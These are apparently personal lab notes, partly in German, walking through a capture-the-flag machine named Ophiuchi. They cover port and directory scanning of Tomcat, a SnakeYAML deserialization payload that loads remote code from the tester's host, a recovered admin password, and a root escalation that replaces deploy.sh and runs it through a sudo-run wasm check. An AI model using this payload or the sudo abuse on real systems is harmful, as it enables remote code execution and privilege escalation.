# Main

Name: Ophiuchi
IP: 10.10.10.227

Ports: 8080 (Apache Tomcat)
22 SSH


rustscan
``rustscan -a 10.10.10.227 -- -sC -sV``

feroxbuster
``feroxbuster -u http://10.10.10.227:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt``


# tomcat
Apache Tomcat/9.0.38

found some manager site

02        0l        0w        0c http://10.10.10.227:8080/test
302        0l        0w        0c http://10.10.10.227:8080/manager
200        0l        0w        0c http://10.10.10.227:8080/Servlet
302        0l        0w        0c http://10.10.10.227:8080/host-manager
302        0l        0w        0c http://10.10.10.227:8080/host-manager/images
302        0l        0w        0c http://10.10.10.227:8080/manager/images
401       63l      291w     2499c http://10.10.10.227:8080/manager/text
401       54l      241w     2044c http://10.10.10.227:8080/host-manager/text
401       63l      291w     2499c http://10.10.10.227:8080/manager/status
401       63l      291w     2499c http://10.10.10.227:8080/manager/html
401       54l      241w     2044c http://10.10.10.227:8080/host-manager/html
302        0l        0w        0c http://10.10.10.227:8080/manager/css

## yaml parser is vulnable


https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858


```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.138/"]
  ]]
]
```


### passwort from user admin

gefunden in conf/tomcat.users.xml

Passwort: whythereisalimit

onf/tomcat-users.xml:<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>

## root



index.go
```
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```


copy /opt/wsm... to ~/
change to that dir
sudo. it

### install wasm-pack
``cargo install wasm-pack``

### create main project
``cargo new --lib main``

### edit lib.rs 
--> create rust program with function info and return value 1 (abstraction from https://github.com/wasmerio/wasmer-go/blob/master/examples/appendices/simple.rs)
```
#[no_mangle]
pub extern "C" fn info() -> i32 {return 1;}
```

### compile the project
``wasm-pack build``

### copy it to the server

change deploy.sh to desired root code and run the sudo command

 


